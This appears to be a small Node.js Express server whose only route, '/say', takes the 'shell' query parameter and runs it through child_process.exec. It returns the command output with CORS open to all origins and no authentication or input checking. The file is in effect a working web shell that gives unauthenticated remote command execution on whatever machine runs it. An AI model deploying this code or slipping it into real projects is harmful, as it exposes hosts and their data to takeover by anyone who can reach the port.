const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
var exec = require('child_process').exec;

const app = express();
const port = 5000;

app.use(cors());
app.use(bodyParser.text());

app.get('/say', (req, res) => {

let  command = req.query.shell

exec(command, function(err, stdout, stderr) {

  if (err) { console.log(stderr);
  res.send(stderr);
  }
  else  { console.log(stdout);
      res.send(stdout);  }

});

});


app.listen(port, () => {
  console.log('Server started on port '+port);
  });